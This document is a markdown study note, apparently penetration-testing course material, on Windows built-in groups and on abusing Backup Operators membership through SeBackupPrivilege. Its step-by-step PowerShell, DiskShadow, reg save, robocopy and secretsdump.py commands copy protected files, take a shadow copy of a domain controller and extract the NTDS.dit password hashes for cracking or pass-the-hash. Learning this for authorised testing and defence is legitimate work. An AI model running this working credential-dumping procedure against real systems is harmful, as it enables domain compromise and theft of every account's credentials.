# Windows Built-in Groups


## 🏢 Windows Built-in Groups

- Windows servers and Domain Controllers have **built-in groups** that grant special rights.
- These groups exist from Server 2008 R2 onward (except Hyper-V Admins from Server 2012).
- Group membership often gives privileges useful for specific tasks (e.g., backup, printing).
- Sometimes service accounts or vendor apps are members.
- Always check group membership to identify possible privilege escalation paths.


### Important Groups to Know:
- **Backup Operators**
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators


## 💼 Backup Operators Group & SeBackupPrivilege

- Being in **Backup Operators** gives two key privileges:
  - **SeBackupPrivilege**: Backup files/folders (read anything).
  - **SeRestorePrivilege**: Restore files/folders.

- **SeBackupPrivilege** lets you read and copy files **even if ACL denies access**.


## 🧪 Using SeBackupPrivilege to Copy Protected Files


### Step 1: Check Your Group Membership

```powershell
whoami /groups
```

Look for membership in **Backup Operators**.


### Step 2: Check if SeBackupPrivilege is Enabled

```powershell
whoami /priv
Get-SeBackupPrivilege
```

If `SeBackupPrivilege` is **Disabled**, enable it:

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

*Note:* You may need an **elevated (admin) command prompt**.


### Step 3: Copy a Protected File Using SeBackupPrivilege Cmdlet

Example: The file `C:\Confidential\2021 Contract.txt` is denied for normal reading.

```powershell
cat 'C:\Confidential\2021 Contract.txt'
# Access denied error

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
# File content is now readable
```


## 🚨 Attacking a Domain Controller with SeBackupPrivilege


### Why Target the Domain Controller?

- The **NTDS.dit** file contains the Active Directory database with all user and computer hashes.
- It is **locked** and inaccessible normally.


### Step 1: Create a Shadow Copy with DiskShadow

```powershell
diskshadow.exe

# Inside diskshadow console:
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Now `E:` is a snapshot of the `C:` drive, including the NTDS.dit file.


### Step 2: Copy NTDS.dit Locally Using SeBackupPrivilege

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```


### Step 3: Back Up SAM and SYSTEM Registry Hives

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

These files can be used to extract local account credentials offline.


## 🔍 Extracting Credentials

- Use tools like **DSInternals PowerShell** or **Impacket secretsdump.py**.

### DSInternals example:

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```


### secretsdump.py example:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

This extracts NTLM hashes which can be cracked offline or used in pass-the-hash attacks.


## 🛠 Using Robocopy in Backup Mode

Instead of external tools, use **robocopy** with the `/B` (backup mode) flag to copy locked files.

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

This copies the `ntds.dit` file from the shadow copy.
